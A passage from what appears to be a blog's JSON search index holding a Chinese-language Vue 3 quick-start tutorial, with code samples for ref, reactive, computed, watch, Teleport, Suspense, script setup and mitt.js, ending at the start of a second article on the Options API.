\u0026#39;hzw\u0026#39;); }; return { show, }; }, \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;template\u0026gt; \u0026lt;button\u0026gt;事件分發\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent } from \u0026#39;vue\u0026#39;; export default defineComponent({ name: \u0026#39;Child\u0026#39;, setup(props, { emit }) { const emitFn = () =\u0026gt; { emit(\u0026#39;show\u0026#39;); }; return { emitFn, }; }, }); \u0026lt;/script\u0026gt; ref 作用：定義一個響應式的資料(一般用來定義一個基本型別的響應式資料 Undefined、Null、Boolean、Number、String) 語法： 1 const xxx = ref(initValue); 注意：script 中操作資料需要使用 xxx.value 的形式，而 template 中不需要新增 .value 用一個例子來演示，實現一個按鈕，點選可以增加數字：\naddNum.vue 1 2 3 4 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{count}}\u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#39;updateCount\u0026#39;\u0026gt;增加\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; 在 Vue2 中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script\u0026gt; // ... data() { return { conunt: 0, }; }, methods: { updateCount() { this.conunt++; }, }, // ... \u0026lt;/script\u0026gt; 在 Vue3 中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;script\u0026gt; // ... setup() { // ref 用於定義一個響應式的資料，返回的是一個 Ref 物件，物件中有一個 value 屬性 // 如果需要對資料進行操作，需要使用該 Ref 物件的 value 屬性 const count = ref(0); function updateCount() { count.value++; } return { count, updateCount }; }, // ... \u0026lt;/script\u0026gt; 在 Vue2 中我們通過 this.$refs 來獲取 dom 節點，Vue3 中我們通過 ref 來獲取節點。\n首先需要在標籤上新增 ref='xxx'，然後再 setup 中定義一個初始值為 null 的 ref 型別，名字要和標籤的 ref 屬性一致。\n1 const xxx = ref(null) 注意 ：一定要在 setup 的 return 中返回，不然會報錯。\n用一個例子來演示，讓輸入框自動獲取焦點：\nautoFocus.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;App\u0026lt;/h2\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34;\u0026gt;--- \u0026lt;input type=\u0026#34;text\u0026#34; ref=\u0026#34;inputRef\u0026#34;\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { onMounted, ref } from \u0026#39;vue\u0026#39; /* ref獲取元素: 利用 ref 函式獲取元件中的標籤元素 功能需求: 讓輸入框自動獲取焦點 */ export default { setup() { const inputRef = ref\u0026lt;HTMLElement|null\u0026gt;(null) onMounted(() =\u0026gt; { inputRef.value \u0026amp;\u0026amp; inputRef.value.focus() }) return { inputRef } }, } \u0026lt;/script\u0026gt; reactive 作用：定義多個數據的響應式，接收一個普通物件然後返回該普通物件的響應式代理器物件(Proxy)，響應式轉換是\u0026quot;深層的\u0026quot;：會影響物件內部所有巢狀的屬性，所有的資料都是響應式的。 語法： 1 const proxy = reactive(obj) 程式碼演示： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;template\u0026gt; \u0026lt;h3\u0026gt;姓名:{{user.name}}\u0026lt;/h3\u0026gt; \u0026lt;h3\u0026gt;年齡:{{user.age}}\u0026lt;/h3\u0026gt; \u0026lt;h3\u0026gt;wife:{{user.wife}}\u0026lt;/h3\u0026gt; \u0026lt;button @click=\u0026#34;updateUser\u0026#34;\u0026gt;更新\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; // ... setup() { const user = reactive({ name: \u0026#39;hzw\u0026#39;, age: 18, wife: { name: \u0026#39;xioaohong\u0026#39;, age: 18, books: [\u0026#39;紅寶書\u0026#39;, \u0026#39;設計模式\u0026#39;, \u0026#39;演算法與資料結構\u0026#39;], }, }); const updateUser = () =\u0026gt; { user.name = \u0026#39;小紅\u0026#39;; user.age += 2; user.wife.books[0] = \u0026#39;金瓶梅\u0026#39;; }; return { user, updateUser, }; }, // ... \u0026lt;/script\u0026gt; computed 與 Vue2 中的 computed 配置功能一致，返回的是一個 ref 型別的物件。 computed 的函式中如果只傳入一個箭頭函式 表示的是 get 操作： 1 2 3 4 5 6 7 8 9 10 11 12 13 import { computed } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;韓\u0026#39;, lastName: \u0026#39;志偉\u0026#39;, }); const fullName1 = computed(() =\u0026gt; { return user.firstName + user.lastName; }); return { user, fullName1, }; computed 的函式中可以傳入一個物件，可以包含 set 和 get 函式，進行讀取和修改的操作： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import { computed } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;韓\u0026#39;, lastName: \u0026#39;志偉\u0026#39;, }); const fullName2 = computed({ get() { return user.firstName + \u0026#39;_\u0026#39; + user.lastName; }, set(val: string) { const names = val.split(\u0026#39;_\u0026#39;); user.firstName = names[0]; user.lastName = names[1]; }, }); return { user, fullName2, }; watch 與 Vue2 中的 watch 配置功能一致。 作用：監視指定的一個或多個響應式資料，一旦資料變化，就自動執行監視回撥。 語法：watch(要監聽的資料, 回調函式, 配置) 預設初始時不執行回調，但可以通過配置的 immediate 為 true，來指定初始時立即執行第一次。 通過配置的 deep 為 true，來指定深度監視。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import { watch, ref } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;韓\u0026#39;, lastName: \u0026#39;志偉\u0026#39;, }); const fullName3 = ref(\u0026#39;\u0026#39;); watch( user, ({ firstName, lastName }) =\u0026gt; { fullName3.value = firstName + \u0026#39;_\u0026#39; + lastName; }, { immediate: true, deep: true } ); return { user, fullName3, }; watch 監聽多個數據，使用陣列。\nwatch 監聽非響應式資料的時候需要使用回調函式的形式。\n1 2 3 4 5 6 7 8 9 10 watch( [ () =\u0026gt; user.firstName, () =\u0026gt; user.lastName, fullName3 ], () =\u0026gt; { console.log(\u0026#39;我執行了\u0026#39;) } ) watchEffect 作用：監視資料發生變化時執行回調，不用直接指定要監視的資料，回調函式中使用的哪些響應式資料就監視哪些響應式資料，預設初始時就會執行第一次，從而可以收集需要監視的資料。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { watchEffect, ref } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;韓\u0026#39;, lastName: \u0026#39;志偉\u0026#39;, }); const fullName4 = ref(\u0026#39;\u0026#39;); watchEffect(() =\u0026gt; { fullName4.value = user.firstName + \u0026#39;_\u0026#39; + user.lastName; }); return { user, fullName4, }; // watchEffect可以實現計算屬性set方法 watchEffect(() =\u0026gt; { const names = fullName3.value.split(\u0026#39;_\u0026#39;); user.firstName = names[0]; user.lastName = names[1]; }); 生命週期對比：\n注意：3.0 中的生命週期鉤子要比 2.X 中相同生命週期的鉤子要快。 Composition API 還新增了以下用於除錯的鉤子函式，但是不怎麼常用：onRenderTracked、onRenderTriggered。 程式碼演示： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 setup() { onBeforeMount(() =\u0026gt; { console.log(\u0026#39;--onBeforeMount\u0026#39;) }) onMounted(() =\u0026gt; { console.log(\u0026#39;--onMounted\u0026#39;) }) onBeforeUpdate(() =\u0026gt; { console.log(\u0026#39;--onBeforeUpdate\u0026#39;) }) onUpdated(() =\u0026gt; { console.log(\u0026#39;--onUpdated\u0026#39;) }) onBeforeUnmount(() =\u0026gt; { console.log(\u0026#39;--onBeforeUnmount\u0026#39;) }) onUnmounted(() =\u0026gt; { console.log(\u0026#39;--onUnmounted\u0026#39;) }) } toRefs 作用：把一個響應式物件轉換成普通物件，該普通物件的每個屬性都是一個 ref。 應用：我們使用 reactive 建立的物件，如果想在模板中使用，就必須得使用 xxx.xxx 的形式，如果大量用到的話還是很麻煩的，但是使用 es6 解構以後，會失去響應式，那麼 toRefs 的作用就體現在這，利用 toRefs 可以將一個響應式 reactive 物件的所有原始屬性轉換為響應式的 ref 屬性。當然小夥伴們可以自行開發更多應用場景。 程式碼演示： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; name:{{name}} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent, reactive, toRefs } from \u0026#39;vue\u0026#39;; export default defineComponent({ name: \u0026#39;\u0026#39;, setup() { const state = reactive({ name: \u0026#39;hzw\u0026#39;, }); const state2 = toRefs(state); setInterval(() =\u0026gt; { state.name += \u0026#39;===\u0026#39;; }, 1000); return { // 通過 toRefs 返回的物件，解構出來的屬性也是響應式的 ...state2, }; }, }); \u0026lt;/script\u0026gt; provide 與 inject 作用：實現跨層級元件(祖孫)間通訊。 程式碼演示： parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;template\u0026gt; \u0026lt;h1\u0026gt;父元件\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;當前顏色: {{color}}\u0026lt;/p\u0026gt; \u0026lt;button @click=\u0026#34;color=\u0026#39;red\u0026#39;\u0026#34;\u0026gt;紅\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;color=\u0026#39;yellow\u0026#39;\u0026#34;\u0026gt;黃\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;color=\u0026#39;blue\u0026#39;\u0026#34;\u0026gt;藍\u0026lt;/button\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;Son /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { provide, ref } from \u0026#39;vue\u0026#39; import Son from \u0026#39;./son.vue\u0026#39; export default { name: \u0026#39;ProvideInject\u0026#39;, components: { Son }, setup() { const color = ref(\u0026#39;red\u0026#39;) provide(\u0026#39;color\u0026#39;, color) return { color } } } \u0026lt;/script\u0026gt; son.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;子元件\u0026lt;/h2\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;GrandSon /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import GrandSon from \u0026#39;./grandson.vue\u0026#39; export default { components: { GrandSon }, } \u0026lt;/script\u0026gt; grandson.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;h3 :style=\u0026#34;{color}\u0026#34;\u0026gt;孫子元件: {{color}}\u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { inject } from \u0026#39;vue\u0026#39; export default { setup() { const color = inject(\u0026#39;color\u0026#39;) return { color } } } \u0026lt;/script\u0026gt; 其他特性 Teleport(瞬移) 作用：Teleport 提供了一種乾淨的方法，讓元件的 html 在父元件介面外的特定標籤(很可能是 body )下插入顯示，換句話說就是可以把子元件或者dom節點插入到任何你想插入到的地方去。 語法：使用 to 屬性，引號內使用選擇器。 1 \u0026lt;teleport to=\u0026#34;body\u0026#34;\u0026gt;\u0026lt;/teleport\u0026gt; 程式碼演示： parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;father\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;App\u0026lt;/h2\u0026gt; \u0026lt;modal-button\u0026gt;\u0026lt;/modal-button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import ModalButton from \u0026#39;./components/ModalButton.vue\u0026#39; export default { setup() { return {} }, components: { ModalButton, }, } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;son\u0026#34;\u0026gt; \u0026lt;button @click=\u0026#34;modalOpen = true\u0026#34;\u0026gt; 點我開啟對話方塊 \u0026lt;/button\u0026gt; \u0026lt;teleport to=\u0026#34;body\u0026#34;\u0026gt; \u0026lt;div v-if=\u0026#34;modalOpen\u0026#34; class=\u0026#34;looklook\u0026#34;\u0026gt; 看看我出現在了哪裡 \u0026lt;button @click=\u0026#34;modalOpen = false\u0026#34;\u0026gt; Close \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/teleport\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref } from \u0026#39;vue\u0026#39; export default { name: \u0026#39;modal-button\u0026#39;, setup() { const modalOpen = ref(false) return { modalOpen, } }, } \u0026lt;/script\u0026gt; 可以看到在子元件中的 looklook 元素跑到了 body 下面，而之前的位置默認出現了兩行註釋。\nSuspense(不確定的) 作用：它們允許我們的應用程式在等待非同步元件時渲染一些後備內容，可以讓我們建立一個平滑的使用者體驗。 語法： 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;Suspense\u0026gt; \u0026lt;template v-slot:default\u0026gt; \u0026lt;!-- 非同步元件 --\u0026gt; \u0026lt;AsyncComp /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template v-slot:fallback\u0026gt; \u0026lt;!-- 後備內容 --\u0026gt; \u0026lt;h1\u0026gt;LOADING...\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/Suspense\u0026gt; vue3 中引入非同步元件的方式：\n1 const AsyncComp = defineAsyncComponent(() =\u0026gt; import(\u0026#39;./AsyncComp.vue\u0026#39;)) 程式碼演示： parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;template\u0026gt; \u0026lt;Suspense\u0026gt; \u0026lt;!-- v-slot:defaul 可以簡寫成 #defaul --\u0026gt; \u0026lt;template v-slot:default\u0026gt; \u0026lt;AsyncComp/\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;!-- v-slot:defaul 可以簡寫成 #fallback --\u0026gt; \u0026lt;template v-slot:fallback\u0026gt; \u0026lt;h1\u0026gt;LOADING...\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/Suspense\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { defineAsyncComponent } from \u0026#39;vue\u0026#39; const AsyncComp = defineAsyncComponent(() =\u0026gt; import(\u0026#39;./AsyncComp.vue\u0026#39;)) export default { setup() { return { } }, components: { AsyncComp, } } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;AsyncComp22\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;{{msg}}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; export default { name: \u0026#39;AsyncComp\u0026#39;, setup () { return new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { resolve({ msg: \u0026#39;abc\u0026#39; }) }, 2000) }) } } \u0026lt;/script\u0026gt; 通過下圖可以看到在非同步元件加載出來之前，顯示的是 fallback 中的內容：\n響應式資料的判斷 作用 isRef：檢查一個值是否為一個 ref 物件 isReactive：檢查一個物件是否是由 reactive 建立的響應式代理 isReadonly：檢查一個物件是否是由 readonly 建立的只讀代理 isProxy：檢查一個物件是否是由 reactive 或者 readonly 方法建立的代理 程式碼演示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 setup() { const state1 = ref(1); console.log(\u0026#39;isref:\u0026#39;, isRef(state1)); // isref: true const state2 = reactive({}); console.log(\u0026#39;isReactive:\u0026#39;, isReactive(state2)); // isReactive: true const state3 = readonly({}); console.log(\u0026#39;isReadonly:\u0026#39;, isReadonly(state3)); // isReadonly: true const state4 = reactive({}); console.log(\u0026#39;isProxy:\u0026#39;, isProxy(state2)); // isProxy: true console.log(\u0026#39;isProxy:\u0026#39;, isProxy(state4)); // isProxy: true return {}; }, 其他不常用特性 還有很多很多不常用的新特性，我在日常開發中是沒有用到的，很多都是用來做優化的，感興趣的小夥伴們自行去官網檢視，或者大佬們可以介紹一下應用場景。\nshallowReactive shallowRef readonly shallowReadonly markRaw customRef \u0026hellip; 語法糖 雖然 Composition API 用起來已經非常方便了，但是我們還是有很煩的地方，比如：\n元件引入了還要註冊。 屬性和方法都要在 setup 函式中返回，有的時候僅一個 return 就十幾行甚至幾十行。 \u0026hellip; 不想寫啊怎麼辦\n好辦， Vue3 官方提供了 script setup 語法糖，只需要在 script 標籤中==新增 setup==，元件只需引入不用註冊，屬性和方法也不用返回，setup 函式也不需要，甚至 export default 都不用寫了，不僅是資料、計算屬性和方法，甚至是自定義指令也可以在我們的 template 中自動獲得。\n但是這麼過癮的語法糖，還是稍微添加了一點點心智負擔，因為沒有了 setup 函式，那麼 props、emit、attrs 怎麼獲取呢，就要介紹一下新的語法了。\nsetup script 語法糖提供了三個新的 API 來供我們使用： ==defineProps==、==defineEmit== 和 ==useContext==。\ndefineProps：用來接收父元件傳來的值 props。 defineEmit：用來宣告觸發的事件表。 useContext：用來獲取元件上下文 context。 程式碼演示 parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;我是父元件！\u0026lt;/h2\u0026gt; \u0026lt;Children msg=\u0026#34;hello\u0026#34; @child-click=\u0026#34;handleClick\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Children from \u0026#39;./components/children.vue\u0026#39; const handleClick = (ctx) =\u0026gt; { console.log(ctx) } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;span @click=\u0026#34;sonClick\u0026#34;\u0026gt;msg: {{ props.msg }}\u0026lt;/span\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useContext, defineProps, defineEmit } from \u0026#39;vue\u0026#39; const emit = defineEmit([\u0026#39;child-click\u0026#39;]) const ctx = useContext() const props = defineProps({ msg: String, }) const sonClick = () =\u0026gt; { emit(\u0026#39;child-click\u0026#39;, ctx) } \u0026lt;/script\u0026gt; 我們點選一下子元件：\n可以看到 context 被列印了出來，其中的 attrs、emit、slots、expose 屬性和方法依然可以使用。props 也可以輸出在頁面上，事件也成功派發。\n其他知識點 接下來介紹一下我使用 Vue3 過程中遇到的問題或者小技巧，不全面，想起什麼就寫什麼吧。\nscript setup 語法糖的坑\n這個很多大佬已經在 Vue3 的 github 上提交 Issues 了，或許會在不久的將來修復，但現在還是要注意一下。\n如果在父元件中通過 ref='xxx' 的方法來獲取子元件實例，那麼子元件不可以使用 script setup 語法糖，否則會報錯。\n程式碼演示 parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;我是父元件！\u0026lt;/h2\u0026gt; \u0026lt;Child ref=\u0026#39;son\u0026#39; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Child from \u0026#39;./components/children.vue\u0026#39; import { ref } from \u0026#39;vue\u0026#39; const son = ref(null) console.log(\u0026#39; ~ son:\u0026#39;, son) \u0026lt;/script\u0026gt; 子元件先不使用語法糖：\nchildren.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; 我是子元件{{msg}} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script \u0026gt; import { ref } from \u0026#39;vue\u0026#39; export default { setup() { const msg = ref(\u0026#39;hello\u0026#39;) return { msg, } }, } 現在把子元件換成 script setup 語法糖再來試一試：\nchildren.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; 我是子元件{{msg}} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const msg = ref(\u0026#39;hello\u0026#39;) \u0026lt;/script\u0026gt; 可以看到現在是獲取不到子元件定義的 msg 屬性的。\nEmit 派發事件可以對引數進行驗證 parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;我是父元件！\u0026lt;/h2\u0026gt; \u0026lt;Child @sonClick=\u0026#39;sonClick\u0026#39; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Child from \u0026#39;./components/Child.vue\u0026#39; import { ref } from \u0026#39;vue\u0026#39; const sonClick = (value) =\u0026gt; { console.log(value) } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; 我是子元件{{ msg }} \u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#34;handleClick(1)\u0026#34;\u0026gt;我是按鈕1\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;handleClick(2)\u0026#34;\u0026gt;我是按鈕2\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref } from \u0026#39;vue\u0026#39; export default { name: \u0026#39;\u0026#39;, emits: { sonClick: (value) =\u0026gt; { if (value === 1) { return true } else { return false } }, }, setup(props, { emit }) { const msg = ref(\u0026#39;hello\u0026#39;) const handleClick = (value) =\u0026gt; { emit(\u0026#39;sonClick\u0026#39;, value) } return { msg, handleClick, } }, } \u0026lt;/script\u0026gt; 我們分別點一下按鈕1和按鈕2，可以看到當我們點了按鈕2的時候，控制檯會發出警告，但是程式會繼續執行，還沒想到什麼適合的應用場景，但是要知道這個知識點，小夥伴們可以在這搞事情。\n跨元件通訊 mitt.js Vue2 中怎麼實現跨元件通訊呢？很多人第一想法就是 event bus。但是 Vue3 移除了 $on、$once、$off 導致不能使用這個方法。但是 Vue 官方給大家推薦了 ==mitt.js==，它的原理就是 event bus。\nmitt.js 教學\n程式碼演示 先安裝： 1 npm i mitt -s 然後封裝成一個 hook： mitt.js 1 2 3 4 import mitt from \u0026#39;mitt\u0026#39; const emitter = mitt(); export default emitter; 使用： parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;我是父元件！\u0026lt;/h2\u0026gt; \u0026lt;Child1 /\u0026gt; \u0026lt;Child2 /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Child1 from \u0026#39;./components/children1.vue\u0026#39; import Child2 from \u0026#39;./components/children2.vue\u0026#39; \u0026lt;/script\u0026gt; children1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; 我是子元件1 \u0026lt;h1\u0026gt;{{msg}}\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref, onUnmounted } from \u0026#39;vue\u0026#39; import emitter from \u0026#39;../mitt\u0026#39; export default { name: \u0026#39;\u0026#39;, setup() { // 初始化 const msg = ref(\u0026#39;hello\u0026#39;) const changeMsg = () =\u0026gt; { msg.value = \u0026#39;world\u0026#39; } // 監聽事件，更新資料 emitter.on(\u0026#39;change-msg\u0026#39;, changeMsg) // 顯式解除安裝 onUnmounted(() =\u0026gt; { emitter.off(\u0026#39;change-msg\u0026#39;, changeMsg) }) return { msg, changeMsg, } }, } \u0026lt;/script\u0026gt; children2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; 我是子元件2 \u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#39;changeMsg\u0026#39;\u0026gt;點選修改msg\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref } from \u0026#39;vue\u0026#39; import emitter from \u0026#39;../mitt\u0026#39; export default { name: \u0026#39;\u0026#39;, setup() { const changeMsg = () =\u0026gt; { emitter.emit(\u0026#39;change-msg\u0026#39;) } return { changeMsg, } }, } \u0026lt;/script\u0026gt; 演示 自定義指令 先看看 Vue2 自定義指令的鉤子：\nbind：當指令繫結在對應元素時觸發，只會觸發一次。 inserted：當對應元素被插入到 DOM 的父元素時觸發。 update：當元素更新時，這個鉤子會被觸發（此時元素的後代元素還沒有觸發更新）。 componentUpdated：當整個元件（包括子元件）完成更新後，這個鉤子觸發。 unbind：當指令被從元素上移除時，這個鉤子會被觸發，也只觸發一次。 在 Vue3 中，官方為了更有助於程式碼的可讀性和風格統一，把自定義指令的鉤子名稱改的更像是元件生命週期，儘管他們是兩回事：\nbind =\u0026gt; beforeMount。 inserted =\u0026gt; mounted。 beforeUpdate：新的鉤子，會在元素自身更新前觸發。 update =\u0026gt; 移除！ componentUpdated =\u0026gt; updated。 beforeUnmount：新的鉤子，當元素自身被解除安裝前觸發。 unbind =\u0026gt; unmounted。 過渡動畫 這個沒有什麼大的改動，只是修改了兩個 class 名字，正是因為沒有什麼大的改動，導致我曾經在這裡栽了大跟頭，寫完了怎麼都不對，後來查官網才知道。\n以下是直接引用官網的原文：\nv-enter-from：定義進入過渡的開始狀態。在元素被插入之前生效，在元素被插入之後的下一幀移除。 v-enter-active：定義進入過渡生效時的狀態。在整個進入過渡的階段中應用，在元素被插入之前生效，在過渡/動畫完成之後移除。這個類可以被用來定義進入過渡的過程時間，延遲和曲線函式。 v-enter-to：定義進入過渡的結束狀態。在元素被插入之後下一幀生效 (與此同時 v-enter-from 被移除)，在過渡/動畫完成之後移除。 v-leave-from：定義離開過渡的開始狀態。在離開過渡被觸發時立刻生效，下一幀被移除。 v-leave-active：定義離開過渡生效時的狀態。在整個離開過渡的階段中應用，在離開過渡被觸發時立刻生效，在過渡/動畫完成之後移除。這個類可以被用來定義離開過渡的過程時間，延遲和曲線函式。 v-leave-to：離開過渡的結束狀態。在離開過渡被觸發之後下一幀生效 (與此同時 v-leave-from 被刪除)，在過渡/動畫完成之後移除。 特別注意的是：\nv-enter 改成了 v-enter-form\nv-leave 改成了 v-leave-from\n其他小知識 Vue3 移除了 filter。 獲取元件實例的方法 getCurrentInstance()：\n這個方法可以獲取到當前元件的實例，相當於 Vue2 中的 this，但是它只在==開發環境==起效果，打包以後會報錯，所以大家不要依賴 getCurrentInstance 方法去獲取元件實例來完成一些主要功能。\n更詳細的可以檢視下面這篇文章：\n關於Vue3獲取當前元件例項的 getCurrentInstance 方法的補充 最後，畢竟是個人總結，難免會出現紕漏和錯誤，期待各路大神的補充和糾正。\n參考 參考網站 Vue3官方中文文件 Vue3.0光速上手 Volar - vue終極開發神器！ Vue3.0 新特性以及使用經驗總結 尚矽谷2021最新Vue.JS教程快速入門到專案實戰（Vue3/VueJS技術詳解） 那個忙了一夜的Vue3動畫很好，就是太短了 ","date":"2022-08-11T00:00:00Z","image":"https://live.staticflickr.com/65535/52277578302_d4a3e0c4aa_o.png","permalink":"https://wayneblog.ga/2022-08-11/vue3-quick-start/","title":"Vue3.0 快速入門，看完基本可以上手搞開發"},{"content":" 參考網站\n參考網站\n回顧 Option API 在了解 Composition Api 之前，首先回顧下我們使用 Option Api 遇到的問題，我們在 Vue2 中常常會需要在特定的區域（data、methods、watch、computed\u0026hellip;）編寫負責相同功能的代碼。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;val\u0026#34; @keyup.enter=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt;{{todo.title}}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data(){ return{ val:\u0026#39;\u0026#39;, todos:[ {id:0, title:\u0026#39;吃饭\u0026#39;, done:false}, {id:1, title:\u0026#39;睡觉\u0026#39;, done:false}, {id:2, title:\u0026#39;lsp\u0026#39;, done:false}, ] } }, methods:{ addTodo(){ this.todos.push({ id:this.todos.length, title:this.val, 